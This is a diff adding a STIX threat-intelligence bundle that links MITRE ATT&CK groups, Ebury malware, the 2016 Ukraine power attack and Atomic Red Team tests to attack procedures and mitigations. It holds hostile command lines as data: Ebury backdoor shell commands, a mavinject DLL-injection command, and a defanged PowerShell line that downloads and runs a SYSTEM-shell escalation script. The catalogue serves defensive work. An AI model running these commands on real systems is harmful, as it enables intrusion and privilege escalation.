@@ -1,0 +1,378 @@
+{
+  "type": "bundle",
+  "id": "bundle--9f1849fa-6365-4628-8b08-48ffdc8bd965",
+  "objects": [
+    {
+      "type": "intrusion-set",
+      "spec_version": "2.1",
+      "id": "intrusion-set--4e868dad-682d-4897-b8df-2dc98f46c68a",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Windigo",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "G0124",
+          "url": "https://attack.mitre.org/groups/G0124/"
+        }
+      ]
+    },
+    {
+      "type": "intrusion-set",
+      "spec_version": "2.1",
+      "id": "intrusion-set--381fcf73-60f6-4ab2-9991-6af3cbc35192",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Sandworm Team",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "G0034",
+          "url": "https://attack.mitre.org/groups/G0034/"
+        }
+      ]
+    },
+    {
+      "type": "malware",
+      "spec_version": "2.1",
+      "id": "malware--d6b3fcd0-1c86-4350-96f0-965ed02fcc51",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Ebury",
+      "is_family": true,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "S0377",
+          "url": "https://attack.mitre.org/software/S0377/"
+        }
+      ]
+    },
+    {
+      "type": "campaign",
+      "spec_version": "2.1",
+      "id": "campaign--aa73efef-1418-4dbe-b43c-87a498e97234",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "2016 Ukraine Electric Power Attack",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "C0025",
+          "url": "https://attack.mitre.org/campaigns/C0025/"
+        }
+      ]
+    },
+    {
+      "type": "course-of-action",
+      "spec_version": "2.1",
+      "id": "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Behavior Prevention on Endpoint",
+      "x_mitre_id": "M1040",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1040",
+          "url": "https://attack.mitre.org/mitigations/M1040/"
+        }
+      ]
+    },
+    {
+      "type": "tool",
+      "spec_version": "2.1",
+      "id": "tool--0ab5d088-bbd0-448c-af46-75bc2f8a8f1a",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "WinPwn",
+      "description": "PowerShell offensive security toolkit; its functions are used in Atomic Red Team tests.",
+      "external_references": [
+        {
+          "source_name": "WinPwn",
+          "url": "https://github.com/S3cur3Th1sSh1t/WinPwn"
+        }
+      ]
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--600ea24d-9137-4a55-a16b-bc264799ebd0",
+      "command_line": "Xxsh"
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--bed4255e-976a-4973-81a0-3b20cc9015bb",
+      "command_line": "Xcsh"
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--affdd394-5a55-4839-9c73-47af17229bd9",
+      "command_line": "Xcls"
+    },
+    {
+      "type": "file",
+      "spec_version": "2.1",
+      "id": "file--4cecd96b-54f6-4653-8ae6-86cb6ae97bbb",
+      "name": "libkeyutils.so.1"
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--3ff0d367-0b41-420e-a232-a1b2af8a0664",
+      "command_line": "mavinject $mypid /INJECTRUNNING \"PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll\""
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--ae332e06-5287-430e-b58e-140bf847b597",
+      "command_line": "Start-Process notepad"
+    },
+    {
+      "type": "file",
+      "spec_version": "2.1",
+      "id": "file--405edb71-2192-4a33-8f8b-4d257b902107",
+      "name": "T1055.001.dll"
+    },
+    {
+      "type": "process",
+      "spec_version": "2.1",
+      "id": "process--51825f8b-fcbd-41fd-b8e9-cda97783fb77",
+      "command_line": "iex(new-object net.webclient).downloadstring('hxxps://raw.githubusercontent[.]com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"
+    },
+    {
+      "type": "file",
+      "spec_version": "2.1",
+      "id": "file--384baf6c-84d6-4ad3-abf4-f84aaec4d624",
+      "name": "Get-UsoClientDLLSystem.ps1"
+    },
+    {
+      "type": "x-procedure",
+      "spec_version": "2.1",
+      "id": "x-procedure--0c14584f-5fab-41ef-9e56-c3c1ee79440f",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Open interactive shell via Ebury backdoor commands",
+      "description": "Get an interactive Unix shell on a compromised Linux server, at the backdoor's or at root's privilege level. The operator sends the custom command Xcsh or Xcls to the trojanized OpenSSH process for a shell with Ebury-level permissions, or Xxsh for a root shell; the backdoored keyutils shared library loaded by OpenSSH handles the commands. Published by MITRE ATT&CK as a procedure example of Ebury (S0377) for T1059.004.",
+      "platforms": [
+        "Linux"
+      ],
+      "tactics": [
+        "execution"
+      ],
+      "x_technique_refs": [
+        "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56"
+      ],
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "S0377",
+          "url": "https://attack.mitre.org/software/S0377/"
+        },
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1059.004",
+          "url": "https://attack.mitre.org/techniques/T1059/004/"
+        }
+      ],
+      "extensions": {
+        "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": {
+          "extension_type": "new-sdo"
+        }
+      },
+      "x_procedure_type": "reporting",
+      "confidence": 75,
+      "x_command_ref": "process--600ea24d-9137-4a55-a16b-bc264799ebd0",
+      "x_observable_refs": [
+        "process--600ea24d-9137-4a55-a16b-bc264799ebd0",
+        "process--bed4255e-976a-4973-81a0-3b20cc9015bb",
+        "process--affdd394-5a55-4839-9c73-47af17229bd9",
+        "file--4cecd96b-54f6-4653-8ae6-86cb6ae97bbb"
+      ]
+    },
+    {
+      "type": "x-procedure",
+      "spec_version": "2.1",
+      "id": "x-procedure--4f6a8c1e-2d3b-4c5e-9a7f-1b2c3d4e5f6a",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Run credential harvesting tool in memory via PowerShell",
+      "description": "Harvest credentials without writing the harvesting tool to disk. PowerShell scripts load and run the credential harvesting tool in memory, out of reach of file-based detection. Published by MITRE ATT&CK as a procedure example of the 2016 Ukraine Electric Power Attack (C0025) for T1059.001; the source gives no command line.",
+      "platforms": [
+        "Windows"
+      ],
+      "tactics": [
+        "execution",
+        "stealth"
+      ],
+      "x_technique_refs": [
+        "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736"
+      ],
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "C0025",
+          "url": "https://attack.mitre.org/campaigns/C0025/"
+        },
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1059.001",
+          "url": "https://attack.mitre.org/techniques/T1059/001/"
+        }
+      ],
+      "extensions": {
+        "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": {
+          "extension_type": "new-sdo"
+        }
+      },
+      "x_procedure_type": "reporting",
+      "confidence": 70
+    },
+    {
+      "type": "x-procedure",
+      "spec_version": "2.1",
+      "id": "x-procedure--0efe5f88-0ef2-4a9a-bf77-f249731107ef",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Inject DLL into running process via mavinject",
+      "description": "Run code inside a legitimate running process. PowerShell starts notepad.exe, then runs the Windows utility mavinject.exe with /INJECTRUNNING to load T1055.001.dll into it; a message box shows from notepad and the test then stops the process. Atomic Red Team test 74496461-11a1-4982-b439-4d87a550d254 for T1055.001; it needs administrator rights and the DLL on disk.",
+      "platforms": [
+        "Windows"
+      ],
+      "tactics": [
+        "stealth",
+        "privilege-escalation"
+      ],
+      "x_technique_refs": [
+        "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945"
+      ],
+      "external_references": [
+        {
+          "source_name": "Atomic Red Team",
+          "description": "Process Injection via mavinject.exe",
+          "external_id": "74496461-11a1-4982-b439-4d87a550d254",
+          "url": "https://www.atomicredteam.io/docs/atomics/T1055.001"
+        }
+      ],
+      "extensions": {
+        "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": {
+          "extension_type": "new-sdo"
+        }
+      },
+      "x_command_ref": "process--3ff0d367-0b41-420e-a232-a1b2af8a0664",
+      "x_observable_refs": [
+        "process--3ff0d367-0b41-420e-a232-a1b2af8a0664",
+        "process--ae332e06-5287-430e-b58e-140bf847b597",
+        "file--405edb71-2192-4a33-8f8b-4d257b902107"
+      ]
+    },
+    {
+      "type": "x-procedure",
+      "spec_version": "2.1",
+      "id": "x-procedure--835eda86-8300-447c-ac88-73c739371ea6",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "name": "Get SYSTEM shell via UsoClient DLL load",
+      "description": "Escalate to a SYSTEM shell from a PowerShell session. PowerShell downloads Get-UsoClientDLLSystem.ps1 from GitHub with Net.WebClient and runs it in memory with IEX; the script uses the UsoClient DLL load technique to bind a SYSTEM shell. Atomic Red Team test 8b56f787-73d9-4f1d-87e8-d07e89cbc7f5 for T1055.001, run through a WinPwn function; it needs outbound access to GitHub.",
+      "platforms": [
+        "Windows"
+      ],
+      "tactics": [
+        "privilege-escalation"
+      ],
+      "x_technique_refs": [
+        "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945"
+      ],
+      "external_references": [
+        {
+          "source_name": "Atomic Red Team",
+          "description": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique",
+          "external_id": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5",
+          "url": "https://www.atomicredteam.io/docs/atomics/T1055.001"
+        }
+      ],
+      "extensions": {
+        "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": {
+          "extension_type": "new-sdo"
+        }
+      },
+      "x_command_ref": "process--51825f8b-fcbd-41fd-b8e9-cda97783fb77",
+      "x_observable_refs": [
+        "process--51825f8b-fcbd-41fd-b8e9-cda97783fb77",
+        "file--384baf6c-84d6-4ad3-abf4-f84aaec4d624"
+      ]
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--d7df14dd-148e-488b-889e-3998feba2d0b",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "x-procedure--0c14584f-5fab-41ef-9e56-c3c1ee79440f",
+      "target_ref": "malware--d6b3fcd0-1c86-4350-96f0-965ed02fcc51"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--0c533959-8dbc-4c54-a038-e9ece0359b3b",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--4e868dad-682d-4897-b8df-2dc98f46c68a",
+      "target_ref": "x-procedure--0c14584f-5fab-41ef-9e56-c3c1ee79440f"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--139716b9-558f-4295-b89d-569977dd88f8",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "intrusion-set--381fcf73-60f6-4ab2-9991-6af3cbc35192",
+      "target_ref": "x-procedure--4f6a8c1e-2d3b-4c5e-9a7f-1b2c3d4e5f6a"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--f091422e-d35a-4736-8cbe-6df5546b5804",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "campaign--aa73efef-1418-4dbe-b43c-87a498e97234",
+      "target_ref": "x-procedure--4f6a8c1e-2d3b-4c5e-9a7f-1b2c3d4e5f6a"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--6e4fe534-28bf-4624-8142-18c0e2e63629",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "mitigates",
+      "source_ref": "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46",
+      "target_ref": "x-procedure--0efe5f88-0ef2-4a9a-bf77-f249731107ef"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--db65198e-96d7-4a49-ab11-d15d0be137dc",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "mitigates",
+      "source_ref": "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46",
+      "target_ref": "x-procedure--835eda86-8300-447c-ac88-73c739371ea6"
+    },
+    {
+      "type": "relationship",
+      "spec_version": "2.1",
+      "id": "relationship--a30509e6-86b2-4ae5-9c94-a138e7517e27",
+      "created": "2026-07-28T07:22:00.000Z",
+      "modified": "2026-07-28T07:22:00.000Z",
+      "relationship_type": "uses",
+      "source_ref": "x-procedure--835eda86-8300-447c-ac88-73c739371ea6",
+      "target_ref": "tool--0ab5d088-bbd0-448c-af46-75bc2f8a8f1a"
+    }
+  ]
+}
